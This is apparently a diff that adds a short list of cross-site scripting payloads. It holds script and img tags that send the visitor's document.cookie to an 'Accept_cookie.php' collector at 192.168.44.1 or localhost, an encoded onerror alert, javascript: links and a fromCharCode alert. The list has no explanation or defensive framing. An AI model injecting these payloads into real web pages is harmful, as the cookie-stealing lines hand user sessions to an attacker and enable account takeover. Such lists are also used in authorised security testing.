@@ -1,0 +1,11 @@
+<script>document.write('<img src="http://192.168.44.1/Accept_cookie.php?cookie='+document.cookie+'"width=0 height=0 border=0 />');alert(/XSS/)</script>
+%c0u003cimg+src%3d1+onerror%3dalert(1)+%c0u003e
+<script>document.location = 'http://localhost/Accept_cookie.php?cookie=' + document.cookie;</script>
+
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+
+<A HREF="http://www.baidu.com/">XSS</A>
+
+<A HREF="http://192.168.44.1/Accept_cookie.php?cookie='+document.cookie+'">XSS</A>
+
+<img src=javascript:alert(String.fromCharCode(88,83,83))>
